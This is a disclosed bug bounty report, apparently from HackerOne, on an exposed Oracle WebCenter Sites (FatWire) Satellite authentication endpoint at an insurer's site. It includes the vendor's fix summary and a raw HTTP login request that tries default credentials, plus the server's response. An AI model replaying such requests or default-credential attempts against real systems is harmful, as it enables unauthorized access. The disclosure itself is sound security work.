@@ -1,0 +1,80 @@
+ReportLink:https://hackerone.com/reports/292463
+WeaknessName:Brute Force
+Reporter:https://hackerone.com/curiositysec
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:200.0
+Severity:medium
+State:Closed
+DateOfDisclosure:11.04.2018 9:41:43
+
+Summary:
+##Issue
+The reporter found yet another vulnerabillity in the Satellite server. This time, an exposed authentication endpoint in the default installation. It was not very clear whether or not this actually was exploitable in any way, as there was no real functionality implemented using this endpoint.
+
+##Fix
+
+The functionality was blocked.
+
+##Reasoning
+
+Running a system which potentially carries a lot of vulnerable endpoints and bad default settings is always a risk. Hardening should always be compulsory. While we do our best to be proactive in running our software securely, we do occasionally hit and miss especially with big off shelf software. 
+
+The reporter provided very good and detailed reporting and assisted in testing. Thanks.
+## Basic report information
+
+Brute Force and Information disclosure
+
+**Domain:** www.lahitapiola.fi
+
+## Steps To Reproduce:
+
+REQUEST
+
+ POST /cs/Satellite HTTP/1.1
+Host: www.lahitapiola.fi
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=FD12DD86CA16B39D29AB24AD5C36187E;TS0159a426=0147052ac536dbb4af71569120fd98f421217a76d772a026f1f189a5633c0d4ef17f36016f;TS0147437c=0147052ac5d61b67f7f4d8a3a3647f8ac06c21013e4230c9d9fbafef038632121559442bdd09b0f4a1bc87780527589bea362731f6;
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+
+pagename=WebServices/Miscellaneous/Login&username=cs&password=Fatwire
+
+
+RESPONSE
+
+HTTP/1.1 200 OK
+Date: Wed, 22 Nov 2017 21:00:16 GMT
+Cache-Control: no-store, max-age=0
+Last-Modified: Wed, 22 Nov 2017 21:00:16 GMT
+Content-Type: application/xml;charset=UTF-8
+Set-Cookie: JSESSIONID=F980D7216E68E4E70DF88A484E42F0EF; Path=/cs/; HttpOnly
+Set-Cookie: SS_X_JSESSIONID=4878001B734F854DB0D8E75886220032; Path=/
+Set-Cookie: fortytwo="!H/mAM8tjmvkH4V1Fa1m6JTfwg/43UFMvIo28l6cixPuJn4Iyyp9tGi8yHfBnPuUIEmliykaKR6RO+g=="; Version=1; Path=/
+Vary: Accept-Encoding,User-Agent
+Expires: Wed, 22 Nov 2017 21:00:16 GMT
+X-UA-Compatible: IE=Edge,chrome=1
+Content-Length: 653
+Connection: close
+Set-Cookie: TS0159a426=0147052ac57750c6f380bd2a293a431af2beb58c9547b9b08477074027dc876b7c6cfd58b333ee6758862323b38a81b2fc6f4d04c50007e2828e2c767104d57e5a6397ffd5; Path=/
+Set-Cookie: TS0147437c=0147052ac5b9c69c1a1b1efa185d80043257f888984230c9d9fbafef038632121559442bdded463b61ebad780a5f4f2b60c78d6045; path=/cs/
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+	
+	
+	
+	
+		<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Header xmlns:fwcs="http://divine.com/someuri/" fwcs:Source="Oracle WebCenter Sites 11gR1 11.1.1.6.1"/><SOAP-ENV:Body><fwcs:result xmlns:fwcs="http://divine.com/someuri/">
+			<result xsi:type="xsd:string">failure</result>
+		
+	
+	
+</fwcs:result></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+## Impact
+
+Brute Force and Information disclosure
